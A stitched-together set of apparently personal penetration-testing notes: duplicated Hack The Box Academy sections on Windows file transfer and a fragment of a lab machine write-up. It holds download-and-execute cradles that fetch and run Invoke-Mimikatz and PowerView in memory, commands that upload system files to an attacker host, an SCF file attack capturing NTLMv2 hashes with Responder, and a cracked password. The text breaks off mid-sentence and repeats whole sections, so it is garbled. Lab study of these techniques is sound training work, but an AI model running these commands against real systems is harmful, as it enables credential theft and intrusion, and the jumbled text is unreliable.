IyBDb3B5cmlnaHQgKGMpIDE5OTMtMjAwOSBNaWNyb3NvZnQgQ29ycC4NCiMNCiMgVGhpcyBpcyBhIHNhbXBsZSBIT1NUUyBmaWxlIHVzZWQgYnkgTWljcm9zb2Z0IFRDUC9JUCBmb3IgV2luZG93cy4NCiMNCiMgVGhpcyBmaWxlIGNvbnRhaW5zIHRoZSBtYXBwaW5ncyBvZiBJUCBhZGRyZXNzZXMgdG8gaG9zdCBuYW1lcy4gRWFjaA0KIyBlbnRyeSBzaG91bGQgYmUga2VwdCBvbiBhbiBpbmRpdmlkdWFsIGxpbmUuIFRoZSBJUCBhZGRyZXNzIHNob3VsZA0KIyBiZSBwbGFjZWQgaW4gdGhlIGZpcnN0IGNvbHVtbiBmb2xsb3dlZCBieSB0aGUgY29ycmVzcG9uZGluZyBob3N0IG5hbWUuDQojIFRoZSBJUCBhZGRyZXNzIGFuZCB0aGUgaG9zdCBuYW1lIHNob3VsZCBiZSBzZXBhcmF0ZWQgYnkgYXQgbGVhc3Qgb25lDQojIHNwYWNlLg0KIw0KIyBBZGRpdGlvbmFsbHksIGNvbW1lbnRzIChzdWNoIGFzIHRoZXNlKSBtYXkgYmUgaW5zZXJ0ZWQgb24gaW5kaXZpZHVhbA0KIyBsaW5lcyBvciBmb2xsb3dpbmcgdGhlIG1hY2hpbmUgbmFtZSBkZW5vdGVkIGJ5IGEgJyMnIHN5bWJvbC4NCiMNCiMgRm9yIGV4YW1wbGU6DQojDQojICAgICAgMTAyLjU0Ljk0Ljk3ICAgICByaGluby5hY21lLmNvbSAgICAgICAgICAjIHNvdXJjZSBzZXJ2ZXINCiMgICAgICAgMzguMjUuNjMuMTAgICAgIHguYWNtZS5jb20gICAgICAgICAgICAgICMgeCBjbGllbnQgaG9zdA0KDQojIGxvY2FsaG9zdCBuYW1lIHJlc29sdXRpb24gaXMgaGFuZGxlZCB3aXRoaW4gRE5TIGl0c2VsZi4NCiMJMTI3LjAuMC4xICAgICAgIGxvY2FsaG9zdA0KIwk6OjEgICAgICAgICAgICAgbG9jYWxob3N0DQo= | base64 -d \u003e hosts\nPietra@htb[/htb]$ md5sum hosts \n3688374325b992def12793500307566d  hosts\n```\n\n## PowerShell Web Uploads\nPowerShell doesn't have a built-in function for upload operations, but we can use `Invoke-WebRequest` or `Invoke-RestMethod` to build our upload function. We'll also need a web server that accepts uploads, which is not a default option in most common webserver utilities.\n\nFor our web server, we can use [uploadserver](https://github.com/Densaugeo/uploadserver), an extended module of the Python [HTTP.server module](https://docs.python.org/3/library/http.server.html), which includes a file upload page. Let's install it and start the webserver.\n\n- Installing a configured WebServer with upload:\n\n```shell\nPietra@htb[/htb]$ pip3 install upload server\n\nPietra@htb[/htb]$ python3 -m uploadserver\nFile upload available at /upload\nServing HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...\n```\n\nNow we can use a PowerShell script [PSUpload.ps1](https://github.com/juliourena/plaintext/blob/master/Powershell/PSUpload.ps1) which uses `Invoke-WebRequest` to perform the upload operations. The script accepts two parameters `-File`, which we use to specify the file path, and `-Uri`, the server URL where we'll upload our file. Let's attempt to upload the host file from our Windows host.\n\n- PowerShell script to upload a file to Python upload server:\n\n```powershell\nPS C:\\htb\u003e IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/juliourena/plaintext/master/Powershell/PSUpload.ps1')\nPS C:\\htb\u003e Invoke-FileUpload -Uri http://192.168.49.128:8000/upload -File C:\\Windows\\System32\\drivers\\etc\\hosts\n\n[+] File Uploaded:  C:\\Windows\\System32\\drivers\\etc\\hosts\n[+] FileHash:  5E7241D66FD77E9E8EA866B6278B2373\n```\n\n## PowerShell Base64 Web Upload\nAnother way to use PowerShell and base64 encoded files for upload operations is by using `Invoke-WebRequest` or `Invoke-RestMethod` together with Netcat. We use Netcat to listen in on a port we specify and send the file as a `POST` request. Finally, we copy the output and use the base64 decode function to convert the base64 string into a file.\n\n```powershell\nPS C:\\htb\u003e $b64 = [System.convert]::ToBase64String((Get-Content -Path 'C:\\Windows\\System32\\drivers\\etc\\hosts' -Encoding Byte))\nPS C:\\htb\u003e Invoke-WebRequest -Uri http://192.168.49.128:8000/ -Method POST -Body $b64\n```\n\nWe catch the base64 data with Netcat and use the base64 application with the decode option to convert the string to the file.\n\n```shell\nPietra@htb[/htb]$ nc -lvnp 8000\nPietra@htb[/htb]$ echo \u003cbase64\u003e | base64 -d -w 0 \u003e hosts\n```\n\n## SMB Uploads\nWe previously discussed that companies usually allow outbound traffic using `HTTP` (TCP/80) and `HTTPS` (TCP/443) protocols. Commonly enterprises don't allow the SMB protocol (TCP/445) out of their internal network because this can open them up to potential attacks. For more information on this, we can read the Microsoft post [Preventing SMB traffic from lateral connections and entering or leaving the network](https://support.microsoft.com/en-us/topic/preventing-smb-traffic-from-lateral-connections-and-entering-or-leaving-the-network-c0541db7-2244-0dce-18fd-14a3ddeb282a).\n\nAn alternative is to run SMB over HTTP with `WebDav`. `WebDAV` [RFC 4918](https://datatracker.ietf.org/doc/html/rfc4918|(RFC 4918) is an extension of HTTP, the internet protocol that web browsers and web servers use to communicate with each other. The `WebDAV` protocol enables a webserver to behave like a fileserver, supporting collaborative content authoring. `WebDAV` can also use HTTPS.\n\nWhen you use `SMB`, it will first attempt to connect using the SMB protocol, and if there's no SMB share available, it will try to connect using HTTP. In the following Wireshark capture, we attempt to connect to the file share `testing3`, and because it didn't find anything with `SMB`, it uses `HTTP`.\n\n![Image](https://academy.hackthebox.com/storage/modules/24/smb-webdav-wireshark.png)\n\n### Configuring webdav server\nTo set up our WebDav server, we need to install two Python modules, `wsgidav` and `cheroot` (you can read more about this implementation here: [wsgidav github](https://github.com/mar10/wsgidav)). After installing them, we run the `wsgidav` application in the target directory.\n\n- Installing WebDav Python modules:\n\n```shell\nPietra@htb[/htb]$ sudo pip install wsgidav cheroot\n\n[sudo] password for plaintext: \nCollecting wsgidav\n  Downloading WsgiDAV-4.0.1-py3-none-any.whl (171 kB)\n     |████████████████████████████████| 171 kB 1.4 MB/s\n     ...SNIP...\n```\n\n- Using the WebDav Python module:\n\n```shell\nPietra@htb[/htb]$ sudo wsgidav --host=0.0.0.0 --port=80 --root=/tmp --auth=anonymous \n\n[sudo] password for plaintext: \nRunning without configuration file.\n10:02:53.949 - WARNING : App wsgidav.mw.cors.Cors(None).is_disabled() returned True: skipping.\n10:02:53.950 - INFO    : WsgiDAV/4.0.1 Python/3.9.2 Linux-5.15.0-15parrot1-amd64-x86_64-with-glibc2.31\n10:02:53.950 - INFO    : Lock manager:      LockManager(LockStorageDict)\n10:02:53.950 - INFO    : Property manager:  None\n10:02:53.950 - INFO    : Domain controller: SimpleDomainController()\n10:02:53.950 - INFO    : Registered DAV providers by route:\n10:02:53.950 - INFO    :   - '/:dir_browser': FilesystemProvider for path '/usr/local/lib/python3.9/dist-packages/wsgidav/dir_browser/htdocs' (Read-Only) (anonymous)\n10:02:53.950 - INFO    :   - '/': FilesystemProvider for path '/tmp' (Read-Write) (anonymous)\n10:02:53.950 - WARNING : Basic authentication is enabled: It is highly recommended to enable SSL.\n10:02:53.950 - WARNING : Share '/' will allow anonymous write access.\n10:02:53.950 - WARNING : Share '/:dir_browser' will allow anonymous read access.\n10:02:54.194 - INFO    : Running WsgiDAV/4.0.1 Cheroot/8.6.0 Python 3.9.2\n10:02:54.194 - INFO    : Serving on http://0.0.0.0:80 ...\n```\n\n- Connecting to the Webdav Share\nNow we can attempt to connect to the share using the `DavWWWRoot` directory.\n\n```cmd\nC:\\htb\u003e dir \\\\192.168.49.128\\DavWWWRoot\n\n Volume in drive \\\\192.168.49.128\\DavWWWRoot has no label.\n Volume Serial Number is 0000-0000\n\n Directory of \\\\192.168.49.128\\DavWWWRoot\n\n05/18/2022  10:05 AM    \u003cDIR\u003e          .\n05/18/2022  10:05 AM    \u003cDIR\u003e          ..\n05/18/2022  10:05 AM    \u003cDIR\u003e          sharefolder\n05/18/2022  10:05 AM                13 filetest.txt\n               1 File(s)             13 bytes\n               3 Dir(s)  43,443,318,784 bytes free\n```\n\n**Note:** `DavWWWRoot` is a special keyword recognised by the Windows Shell. No such folder exists on your WebDAV server. The DavWWWRoot keyword tells the Mini-Redirector driver, which handles WebDAV requests that you are connecting to the root of the WebDAV server.\n\nYou can avoid using this keyword if you specify a folder that exists on your server when connecting to the server. For example: `\\192.168.49.128\\sharefolder`.\n\n- Uploading Files using SMB\n\n```cmd\nC:\\htb\u003e copy C:\\Users\\john\\Desktop\\SourceCode.zip \\\\192.168.49.129\\DavWWWRoot\\\nC:\\htb\u003e copy C:\\Users\\john\\Desktop\\SourceCode.zip \\\\192.168.49.129\\sharefolder\\\n```\n\n**Note:** If there are no SMB (TCP/445) restrictions, you can use impacket-smbserver the same way we set it up for download operations.\n\n## FTP Uploads\nUploading files using FTP is very similar to downloading files.

It is a **MFP Firmware Update Center** with the username `admin`.\n\nWe also have 135 and 445, so it is listening on **SMB**.\n\nWe can try:\n\n```bash\nsmbclient -L \\\\$ip\n\nEnter WORKGROUP\\hanato's password: \nsession setup failed: NT_STATUS_ACCESS_DENIED\n\nsmbclient -N -L \\\\$ip\nsession setup failed: NT_STATUS_ACCESS_DENIED\n```\n\n- `-L`: list.\n- `-N`: no pass, suppresses the normal password prompt, useful when there is no password.\n\nWe can use CrackMapExec ([CME](https://wiki.porchetta.industries/)). It automates assessing the security of **large** Active Directory networks. It makes heavy use of **Impacket**. More info [here](https://www.ivoidwarranties.tech/posts/pentesting-tuts/cme/crackmapexec/).\n\n```bash\ncme smb 10.10.11.106\n\nSMB         10.10.11.106    445    DRIVER           [*] Windows 10 Enterprise 10240 x64 (name:DRIVER) (domain:DRIVER) (signing:False) (SMBv1:True)\n```\n\nSo the host is **Windows 10 Enterprive 10240 x64**. It could be either a domain controller or a windows bus. \n\nWe go in the website and try the login `admin:admin` which works! We can see in firmware updates that we can upload a file, very promising. Also, the URL ends in `.php`.\n\nWe can enumerate the directories:\n\n```bash\ngobuster dir -u http://10.10.11.106 -U admin -P admin -x php -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -o gobuster.out\n```\n\n- `-U`: username.\n- `-P`: password.\n- `-x`: file type.\n\nOk, while this is running we can explore the website. We could probably try a [SCF file attack](https://pentestlab.blog/2017/12/13/smb-share-scf-file-attacks/).\n\nThe SCF:\n\n```bash\n`[Shell]`\n\n`Command=``2`\n\n`IconFile=\\\\X.X.X.X\\share\\pentestlab.ico`\n\n`[Taskbar]`\n\n`Command=ToggleDesktop`\n```\n\nWe can use **Responder** (in `/usr/share/responder`). I forgot THM open so I'll be using **tun1** not **tun0**:\n\n```bash\nsudo ./Responder.py -I tun1\n```\n\nThen we upload our **SCF** file, we get:\n\n```bash\n[+] Listening for events...\n\n[SMB] NTLMv2-SSP Client   : 10.10.11.106\n[SMB] NTLMv2-SSP Username : DRIVER\\tony\n[SMB] NTLMv2-SSP Hash     : tony::DRIVER:3cf31016af90b3f5:27F3BAFD0569B4BCCB3512953792F56C:01010000000000000093F52B139AD80176C9F467FDFAD8A90000000002000800570056004B00510001001E00570049004E002D004A0047004D00340050004B004A00330038003200470004003400570049004E002D004A0047004D00340050004B004A0033003800320047002E00570056004B0051002E004C004F00430041004C0003001400570056004B0051002E004C004F00430041004C0005001400570056004B0051002E004C004F00430041004C00070008000093F52B139AD80106000400020000000800300030000000000000000000000000200000C0ED0045D2EFEA0FAB50E04EE1CABF0C376E10707EB410B0555517338A2C53A40A001000000000000000000000000000000000000900200063006900660073002F00310030002E00310030002E00310034002E0031003200000000000000000000000000\n[*] Skipping previously captured hash for DRIVER\\tony\n[*] Skipping previously captured hash for DRIVER\\tony\n[*] Skipping previously captured hash for DRIVER\\tony\n[*] Skipping previously captured hash for DRIVER\\tony\n[*] Skipping previously captured hash for DRIVER\\tony\n[*] Skipping previously captured hash for DRIVER\\tony\n[*] Skipping previously captured hash for DRIVER\\tony\n[*] Skipping previously captured hash for DRIVER\\tony\n[*] Skipping previously captured hash for DRIVER\\tony\n[*] Skipping previously captured hash for DRIVER\\tony\n[*] Skipping previously captured hash for DRIVER\\tony\n[*] Skipping previously captured hash for DRIVER\\tony\n[*] Skipping previously captured hash for DRIVER\\tony\n```\n\nI will try to figure out the hash:\n\n```bash\nhashcat driver.hash -m 5600 /usr/share/wordlists/rockyou.txt\n\nHost memory required for this attack: 64 MB\n\nDictionary cache built:\n* Filename..: /usr/share/wordlists/rockyou.txt\n* Passwords.: 14344392\n* Bytes.....: 139921507\n* Keyspace..: 14344385\n* Runtime...: 1 sec\n\nTONY::DRIVER:3cf31016af90b3f5:27f3bafd0569b4bccb3512953792f56c:01010000000000000093f52b139ad80176c9f467fdfad8a90000000002000800570056004b00510001001e00570049004e002d004a0047004d00340050004b004a00330038003200470004003400570049004e002d004a0047004d00340050004b004a0033003800320047002e00570056004b0051002e004c004f00430041004c0003001400570056004b0051002e004c004f00430041004c0005001400570056004b0051002e004c004f00430041004c00070008000093f52b139ad80106000400020000000800300030000000000000000000000000200000c0ed0045d2efea0fab50e04ee1cabf0c376e10707eb410b0555517338a2c53a40a001000000000000000000000000000000000000900200063006900660073002f00310030002e00310030002e00310034002e0031003200000000000000000000000000:liltony\n```\n\n- `-m`: the type of hash, figured out by looking at [this](https://hashcat.net/wiki/doku.php?id=example_hashes) table.\n\nThe password is `liltony`!

we can confirm if the file was transferred successfully using the [Get-FileHash](https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.utility/get-filehash?view=powershell-7.2) cmdlet, which does the same thing that `md5sum` does.\n\n```powershell\nPS C:\\htb\u003e Get-FileHash C:\\Users\\Public\\id_rsa -Algorithm md5\n\nAlgorithm       Hash                                                                   Path\n---------       ----                                                                   ----\nMD5             4E301756A07DED0A2DD6953ABF015278                                       C:\\Users\\Public\\id_rsa\n```\n\nWhile this method is convenient, it's not always possible to use. Windows Command Line utility (cmd.exe) has a maximum string length of 8,191 characters. Also, a web shell may error if you attempt to send extremely large strings.\n\n#### Downloading Files using PowerShell\n- DownloadFile method: we can specify the class name `Net.WebClient` and the method `DownloadFile` with the parameters corresponding to the URL of the target file to download and the output file name.\n\n```powershell\nPS C:\\htb\u003e # Example: (New-Object Net.WebClient).DownloadFile('\u003cTarget File URL\u003e','\u003cOutput File Name\u003e')\n\nPS C:\\htb\u003e (New-Object Net.WebClient).DownloadFile('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1','C:\\Users\\Public\\Downloads\\PowerView.ps1')\n\nPS C:\\htb\u003e # Example: (New-Object Net.WebClient).DownloadFileAsync('\u003cTarget File URL\u003e','\u003cOutput File Name\u003e')\n\nPS C:\\htb\u003e (New-Object Net.WebClient).DownloadFileAsync('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1', 'PowerViewAsync.ps1')\n```\n\n- Fileless Method: as we previously discussed, fileless attacks work by using some operating system functions to download the payload and execute it directly. PowerShell can also be used to perform fileless attacks. Instead of downloading a PowerShell script to disk, we can run it directly in memory using the [Invoke-Expression](https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.utility/invoke-expression?view=powershell-7.2) cmdlet or the alias `IEX`.\n\n```powershell\nPS C:\\htb\u003e IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Mimikatz.ps1')\n```\n\n`IEX` also accepts pipeline input.\n\n```powershell\nPS C:\\htb\u003e (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Mimikatz.ps1') | IEX\n```\n\n- Invoke-WebRequest: from PowerShell 3.0 onwards, the [Invoke-WebRequest](https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.utility/invoke-webrequest?view=powershell-7.2) cmdlet is also available, but it is noticeably slower at downloading files. You can use the aliases `iwr`, `curl`, and `wget` instead of the `Invoke-WebRequest` full name.\n\n```powershell\nPS C:\\htb\u003e Invoke-WebRequest https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1 -OutFile PowerView.ps1\n```\n\nHarmj0y has compiled an extensive list of PowerShell download cradles [here](https://gist.github.com/HarmJ0y/bb48307ffa663256e239). \n\n#### Setup Internet Explorer Error\n\n![image](https://academy.hackthebox.com/storage/modules/24/IE_settings.png)\n\nCan be bypassed using the parameter `-UseBasicParsing`:\n\n```powershell\nPS C:\\htb\u003e Invoke-WebRequest https://\u003cip\u003e/PowerView.ps1 | IEX\n\nInvoke-WebRequest : The response content cannot be parsed because the Internet Explorer engine is not available, or Internet Explorer's first-launch configuration is not complete. Specify the UseBasicParsing parameter and try again.\nAt line:1 char:1\n+ Invoke-WebRequest https://raw.githubusercontent.com/PowerShellMafia/P ...\n+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n+ CategoryInfo : NotImplemented: (:) [Invoke-WebRequest], NotSupportedException\n+ FullyQualifiedErrorId : WebCmdletIEDomNotSupportedException,Microsoft.PowerShell.Commands.InvokeWebRequestCommand\n\nPS C:\\htb\u003e Invoke-WebRequest https://\u003cip\u003e/PowerView.ps1 -UseBasicParsing | IEX\n```\n\n#### SMB Downloads\nThe Server Message Block protocol (SMB protocol) that runs on port TCP/445 is common in enterprise networks where Windows services are running. It enables applications and users to transfer files to and from remote servers.\n\nWe can use SMB to download files easily. We need to create an SMB server with [smbserver.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/smbserver.py) from Impacket and then use `copy`, `move`, PowerShell `Copy-Item`, or any other tool that allows connection to SMB.\n\n- Create the server:\n```shell\nPietra@htb[/htb]$ sudo impacket-smbserver share -smb2support /tmp/smbshare\n\nImpacket v0.9.22 - Copyright 2020 SecureAuth Corporation\n\n[*] Config file parsed\n[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0\n[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0\n[*] Config file parsed\n[*] Config file parsed\n[*] Config file parsed\n```\n\n- Copy file from SMB server:\n```cmd\nC:\\htb\u003e copy \\\\192.168.220.133\\share\\nc.exe\n\n        1 file(s) copied.\n```\n\nIn this case:\n\n```cmd\nC:\\htb\u003e copy \\\\192.168.220.133\\share\\nc.exe\n\nYou can't access this shared folder because your organization's security policies block unauthenticated guest access. These policies help protect your PC from unsafe or malicious devices on the network.\n```\n\nWe can set the username and password using the Impacket SMB server and mount it on our windows target machine:\n\n1. Create the SMB server with a username and password:\n```shell\nPietra@htb[/htb]$ sudo impacket-smbserver share -smb2support /tmp/smbshare -user test -password test\n\nImpacket v0.9.22 - Copyright 2020 SecureAuth Corporation\n\n[*] Config file parsed\n[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0\n[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0\n[*] Config file parsed\n[*] Config file parsed\n[*] Config file parsed\n```\n\n2. Mount the SMB Server with username and password:\n\n```cmd\nC:\\htb\u003e net use n: \\\\192.168.220.133\\share /user:test test\n\nThe command completed successfully.\n\nC:\\htb\u003e copy n:\\nc.exe\n        1 file(s) copied.\n```\n\n#### FTP Downloads\nAnother way to transfer files is using FTP (File Transfer Protocol), which use port TCP/21 and TCP/20. We can use the FTP client or PowerShell Net.WebClient to download files from an FTP server.\n\nWe can configure an FTP Server in our attack host using Python3 `pyftpdlib` module. It can be installed with the following command:\n\n- Installing the FTP Server Python3 Module - pyftpdlib\n\n```shell\nPietra@htb[/htb]$ sudo pip3 install pyftpdlib\n```\n\nThen we can specify port number 21 because, by default, `pyftpdlib` uses port 2121. Anonymous authentication is enabled by default if we don't set a user and password.\n\n- Setting up a Python3 FTP Server\n\n```shell\nPietra@htb[/htb]$ sudo python3 -m pyftpdlib --port 21\n\n[I 2022-05-17 10:09:19] concurrency model: async\n[I 2022-05-17 10:09:19] masquerade (NAT) address: None\n[I 2022-05-17 10:09:19] passive ports: None\n[I 2022-05-17 10:09:19] \u003e\u003e\u003e starting FTP server on 0.0.0.0:21, pid=3210 \u003c\u003c\u003c\n```\n\nAfter the FTP server is set up, we can perform file transfers using the pre-installed FTP client from Windows or PowerShell `Net.WebClient`.\n\n- Transferring Files from an FTP Server Using PowerShell\n\n```powershell\nPS C:\\htb\u003e (New-Object Net.WebClient).DownloadFile('ftp://192.168.49.128/file.txt', 'ftp-file.txt')\n```\n\nWhen we get a shell on a remote machine, we may not have an interactive shell. If that's the case, we can create an FTP command file to download a file. First, we need to create a file containing the commands we want to execute and then use the FTP client to use that file to download that file.\n\n- Create a Command File for the FTP Client and Download the Target File\n\n```cmd\nC:\\htb\u003e echo open 192.168.49.128 \u003e ftpcommand.txt\nC:\\htb\u003e echo USER anonymous \u003e\u003e ftpcommand.txt\nC:\\htb\u003e echo binary \u003e\u003e ftpcommand.txt\nC:\\htb\u003e echo GET file.txt \u003e\u003e ftpcommand.txt\nC:\\htb\u003e echo bye \u003e\u003e ftpcommand.txt\nC:\\htb\u003e ftp -v -n -s:ftpcommand.txt\nftp\u003e open 192.168.49.128\nLog in with USER and PASS first.\nftp\u003e USER anonymous\n\nftp\u003e GET file.txt\nftp\u003e bye\n\nC:\\htb\u003emore file.txt\nThis is a test file\n```\n\n## Upload Operations\n#### PowerShell Base64 Encode and Decode\n- Encode using PowerShell:\n\n```powershell\nPS C:\\htb\u003e [Convert]::ToBase64String((Get-Content -path \"C:\\Windows\\system32\\drivers\\etc\\hosts\" -Encoding byte))\n\nIyBDb3B5cmlnaHQgKGMpIDE5OTMtMjAwOSBNaWNyb3NvZnQgQ29ycC4NCiMNCiMgVGhpcyBpcyBhIHNhbXBsZSBIT1NUUyBmaWxlIHVzZWQgYnkgTWljcm9zb2Z0IFRDUC9JUCBmb3IgV2luZG93cy4NCiMNCiMgVGhpcyBmaWxlIGNvbnRhaW5zIHRoZSBtYXBwaW5ncyBvZiBJUCBhZGRyZXNzZXMgdG8gaG9zdCBuYW1lcy4gRWFjaA0KIyBlbnRyeSBzaG91bGQgYmUga2VwdCBvbiBhbiBpbmRpdmlkdWFsIGxpbmUuIFRoZSBJUCBhZGRyZXNzIHNob3VsZA0KIyBiZSBwbGFjZWQgaW4gdGhlIGZpcnN0IGNvbHVtbiBmb2xsb3dlZCBieSB0aGUgY29ycmVzcG9uZGluZyBob3N0IG5hbWUuDQojIFRoZSBJUCBhZGRyZXNzIGFuZCB0aGUgaG9zdCBuYW1lIHNob3VsZCBiZSBzZXBhcmF0ZWQgYnkgYXQgbGVhc3Qgb25lDQojIHNwYWNlLg0KIw0KIyBBZGRpdGlvbmFsbHksIGNvbW1lbnRzIChzdWNoIGFzIHRoZXNlKSBtYXkgYmUgaW5zZXJ0ZWQgb24gaW5kaXZpZHVhbA0KIyBsaW5lcyBvciBmb2xsb3dpbmcgdGhlIG1hY2hpbmUgbmFtZSBkZW5vdGVkIGJ5IGEgJyMnIHN5bWJvbC4NCiMNCiMgRm9yIGV4YW1wbGU6DQojDQojICAgICAgMTAyLjU0Ljk0Ljk3ICAgICByaGluby5hY21lLmNvbSAgICAgICAgICAjIHNvdXJjZSBzZXJ2ZXINCiMgICAgICAgMzguMjUuNjMuMTAgICAgIHguYWNtZS5jb20gICAgICAgICAgICAgICMgeCBjbGllbnQgaG9zdA0KDQojIGxvY2FsaG9zdCBuYW1lIHJlc29sdXRpb24gaXMgaGFuZGxlZCB3aXRoaW4gRE5TIGl0c2VsZi4NCiMJMTI3LjAuMC4xICAgICAgIGxvY2FsaG9zdA0KIwk6OjEgICAgICAgICAgICAgbG9jYWxob3N0DQo=\nPS C:\\htb\u003e Get-FileHash \"C:\\Windows\\system32\\drivers\\etc\\hosts\" -Algorithm MD5 | select Hash\n\nHash\n----\n3688374325B992DEF12793500307566D\n```\n\nWe copy this content and paste it into our attack host, use the `base64` command to decode it, and use the `md5sum` application to confirm the transfer happened correctly.\n\n- Decode Base64 String in Linux:\n\n```shell\nPietra@htb[/htb]$ echo IyBDb3B5cmlnaHQgKGMpIDE5OTMtMjAwOSBNaWNyb3NvZnQgQ29ycC4NCiMNCiMgVGhpcyBpcyBhIHNhbXBsZSBIT1NUUyBmaWxlIHVzZWQgYnkgTWljcm9zb2Z0IFRDUC9JUCBmb3IgV2luZG93cy4NCiMNCiMgVGhpcyBmaWxlIGNvbnRhaW5zIHRoZSBtYXBwaW5ncyBvZiBJUCBhZGRyZXNzZXMgdG8gaG9zdCBuYW1lcy4gRWFjaA0KIyBlbnRyeSBzaG91bGQgYmUga2VwdCBvbiBhbiBpbmRpdmlkdWFsIGxpbmUuIFRoZSBJUCBhZGRyZXNzIHNob3VsZA0KIyBiZSBwbGFjZWQgaW4gdGhlIGZpcnN0IGNvbHVtbiBmb2xsb3dlZCBieSB0aGUgY29ycmVzcG9uZGluZyBob3N0IG5hbWUuDQojIFRoZSBJUCBhZGRyZXNzIGFuZCB0aGUgaG9zdCBuYW1lIHNob3VsZCBiZSBzZXBhcmF0ZWQgYnkgYXQgbGVhc3Qgb25lDQojIHNwYWNlLg0KIw0KIyBBZGRpdGlvbmFsbHksIGNvbW1lbnRzIChzdWNoIGFzIHRoZXNlKSBtYXkgYmUgaW5zZXJ0ZWQgb24gaW5kaXZpZHVhbA0KIyBsaW5lcyBvciBmb2xsb3dpbmcgdGhlIG1hY2hpbmUgbmFtZSBkZW5vdGVkIGJ5IGEgJyMnIHN5bWJvbC4NCiMNCiMgRm9yIGV4YW1wbGU6DQojDQojICAgICAgMTAyLjU0Ljk0Ljk3ICAgICByaGluby5hY21lLmNvbSAgICAgICAgICAjIHNvdXJjZSBzZXJ2ZXINCiMgICAgICAgMzguMjUuNjMuMTAgICAgIHguYWNtZS5jb20gICAgICAgICAgICAgICMgeCBjbGllbnQgaG9zdA0KDQojIGxvY2FsaG9zdCBuYW1lIHJlc29sdXRpb24gaXMgaGFuZGxlZCB3aXRoaW4gRE5TIGl0c2VsZi4NCiMJMTI3LjAuMC4xICAgICAgIGxvY2FsaG9zdA0KIwk6OjEgICAgICAgICAgICAgbG9jYWxob3N0DQo= | base64 -d \u003e hosts\nPietra@htb[/htb]$ md5sum hosts \n3688374325b992def12793500307566d  hosts\n```\n\n#### PowerShell Web Uploads\nPowerShell doesn't have a built-in function for upload operations, but we can use `Invoke-WebRequest` or `Invoke-RestMethod` to build our upload function. We'll also need a web server that accepts uploads, which is not a default option in most common webserver utilities.\n\nFor our web server, we can use [uploadserver](https://github.com/Densaugeo/uploadserver), an extended module of the Python [HTTP.server module](https://docs.python.org/3/library/http.server.html), which includes a file upload page. Let's install it and start the webserver.\n\n- Installing a configured WebServer with upload:\n\n```shell\nPietra@htb[/htb]$ pip3 install upload server\n\nPietra@htb[/htb]$ python3 -m uploadserver\nFile upload available at /upload\nServing HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...\n```\n\nNow we can use a PowerShell script [PSUpload.ps1](https://github.com/juliourena/plaintext/blob/master/Powershell/PSUpload.ps1) which uses `Invoke-WebRequest` to perform the upload operations. The script accepts two parameters `-File`, which we use to specify the file path, and `-Uri`, the server URL where we'll upload our file. Let's attempt to upload the host file from our Windows host.\n\n- PowerShell script to upload a file to Python upload server:\n\n```powershell\nPS C:\\htb\u003e IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/juliourena/plaintext/master/Powershell/PSUpload.ps1')\nPS C:\\htb\u003e Invoke-FileUpload -Uri http://192.168.49.128:8000/upload -File C:\\Windows\\System32\\drivers\\etc\\hosts\n\n[+] File Uploaded:  C:\\Windows\\System32\\drivers\\etc\\hosts\n[+] FileHash:  5E7241D66FD77E9E8EA866B6278B2373\n```\n\n#### PowerShell Base64 Web Upload\nAnother way to use PowerShell and base64 encoded files for upload operations is by using `Invoke-WebRequest` or `Invoke-RestMethod` together with Netcat. We use Netcat to listen in on a port we specify and send the file as a `POST` request. Finally, we copy the output and use the base64 decode function to convert the base64 string into a file.\n\n```powershell\nPS C:\\htb\u003e $b64 = [System.convert]::ToBase64String((Get-Content -Path 'C:\\Windows\\System32\\drivers\\etc\\hosts' -Encoding Byte))\nPS C:\\htb\u003e Invoke-WebRequest -Uri http://192.168.49.128:8000/ -Method POST -Body $b64\n```\n\nWe catch the base64 data with Netcat and use the base64 application with the decode option to convert the string to the file.\n\n```shell\nPietra@htb[/htb]$ nc -lvnp 8000\nPietra@htb[/htb]$ echo \u003cbase64\u003e | base64 -d -w 0 \u003e hosts\n```\n\n#### SMB Uploads\nWe previously discussed that companies usually allow outbound traffic using `HTTP` (TCP/80) and `HTTPS` (TCP/443) protocols. Commonly enterprises don't allow the SMB protocol (TCP/445) out of their internal network because this can open them up to potential attacks. For more information on this, we can read the Microsoft post [Preventing SMB traffic from lateral connections and entering or leaving the network](https://support.microsoft.com/en-us/topic/preventing-smb-traffic-from-lateral-connections-and-entering-or-leaving-the-network-c0541db7-2244-0dce-18fd-14a3ddeb282a).\n\nAn alternative is to run SMB over HTTP with `WebDav`. `WebDAV` [(RFC 4918)](RFC%204918)) is an extension of HTTP, the internet protocol that web browsers and web servers use to communicate with each other. The `WebDAV` protocol enables a webserver to behave like a fileserver, supporting collaborative content authoring. `WebDAV` can also use HTTPS.\n\nWhen you use `SMB`, it will first attempt to connect using the SMB protocol, and if there's no SMB share available, it will try to connect using HTTP. In the following Wireshark capture, we attempt to connect to the file share `testing3`, and because it didn't find anything with `SMB`, it uses `HTTP`.\n\n![Image](https://academy.hackthebox.com/storage/modules/24/smb-webdav-wireshark.png)\n\n#### Configuring webdav server\nTo set up our WebDav server, we need to install two Python modules, `wsgidav` and `cheroot` (you can read more about this implementation 